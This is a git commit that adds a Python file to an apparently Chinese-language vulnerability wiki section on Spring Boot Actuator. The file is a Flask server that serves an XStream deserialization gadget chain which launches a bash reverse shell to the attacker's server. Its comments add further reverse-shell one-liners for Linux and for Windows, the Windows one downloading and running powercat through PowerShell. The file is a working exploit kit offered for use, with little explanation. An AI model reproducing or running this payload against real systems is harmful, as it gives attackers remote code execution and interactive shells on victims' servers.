44c7943d8a98faf9b32413f9ba6186edd2389c7c
GitHubTest <test.github.com>
2022-10-25 20:22:54 +0800

    Spring Actuator

---
+++ Wiki/开发框架漏洞/Spring/Actuator/file/example.py
@@ -0,0 +1,55 @@
+# linux反弹shell bash -i >&amp; /dev/tcp/x.x.x.x/9999 0>&amp;1
+# windows反弹shell
+# <string>powershell</string>
+# <string>IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');</string>
+# <string>powercat -c x.x.x.x -p 2333 -e cmd</string>
+
+from flask import Flask, Response
+
+app = Flask(__name__)
+
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>', methods = ['GET', 'POST'])
+def catch_all(path):
+    xml = """<linked-hash-set>
+  <jdk.nashorn.internal.objects.NativeString>
+    <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+      <dataHandler>
+        <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
+          <is class="javax.crypto.CipherInputStream">
+            <cipher class="javax.crypto.NullCipher">
+              <serviceIterator class="javax.imageio.spi.FilterIterator">
+                <iter class="javax.imageio.spi.FilterIterator">
+                  <iter class="java.util.Collections$EmptyIterator"/>
+                  <next class="java.lang.ProcessBuilder">
+                    <command>
+                      <string>/bin/bash</string>
+                      <string>-c</string>
+                      <string>bash -i >&amp; /dev/tcp/<yourvpsip>/8446 0>&amp;1</string> 
+                    </command>
+                    <redirectErrorStream>false</redirectErrorStream>
+                  </next>
+                </iter>
+                <filter class="javax.imageio.ImageIO$ContainsFilter">
+                  <method>
+                    <class>java.lang.ProcessBuilder</class>
+                    <name>start</name>
+                    <parameter-types/>
+                  </method>
+                  <name>foo</name>
+                </filter>
+                <next class="string">foo</next>
+              </serviceIterator>
+              <lock/>
+            </cipher>
+            <input class="java.lang.ProcessBuilder$NullInputStream"/>
+            <ibuffer></ibuffer>
+          </is>
+        </dataSource>
+      </dataHandler>
+    </value>
+  </jdk.nashorn.internal.objects.NativeString>
+</linked-hash-set>"""
+    return Response(xml, mimetype='application/xml')
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=2222)
